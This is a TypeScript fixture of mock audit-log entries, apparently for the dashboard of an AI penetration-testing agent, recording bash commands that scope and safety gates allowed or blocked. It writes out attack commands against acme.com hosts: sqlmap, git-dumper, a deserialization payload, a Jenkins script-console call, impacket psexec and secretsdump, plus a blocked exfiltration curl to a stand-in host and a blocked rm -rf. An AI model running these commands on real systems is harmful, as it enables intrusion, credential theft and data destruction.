import type { Audit } from "@/lib/types";

const T = (iso: string) => iso; // readability helper for timestamps

export const audit: Audit = {
  attributions: { allow: 312, block: 9 },
  entries: [
    {
      ts: T("2026-11-14T03:33:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
    },
    {
      ts: T("2026-11-14T03:57:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
    },
    {
      ts: T("2026-11-14T02:10:00Z"),
      tool: "bash",
      action: "block",
      reason: "Out of scope: out.evil.example is not in scope",
      command: "curl https://out.evil.example/exfil",
    },
    {
      ts: T("2026-11-13T22:03:00Z"),
      tool: "bash",
      action: "allow",
      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
    },
    {
      ts: T("2026-11-13T21:00:00Z"),
      tool: "bash",
      action: "block",
      reason: "Destructive command gate: rm -rf was denied",
      command: "rm -rf /var/www",
    },
    {
      ts: T("2026-11-13T20:30:00Z"),
      tool: "bash",
      action: "allow",
      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
    },
    {
      ts: T("2026-11-13T15:20:00Z"),
      tool: "bash",
      action: "allow",
      command:
        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
    },
    {
      ts: T("2026-11-13T21:40:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
    },
    {
      ts: T("2026-11-14T00:00:00Z"),
      tool: "bash",
      action: "allow",
      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
    },
    {
      ts: T("2026-11-14T00:05:00Z"),
      tool: "bash",
      action: "block",
      reason: "Data exfiltration gate: secretsdump requires manual approval",
      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
    },
    {
      ts: T("2026-11-14T00:06:00Z"),
      tool: "bash",
      action: "allow",
      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # approved and allowed",
    },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
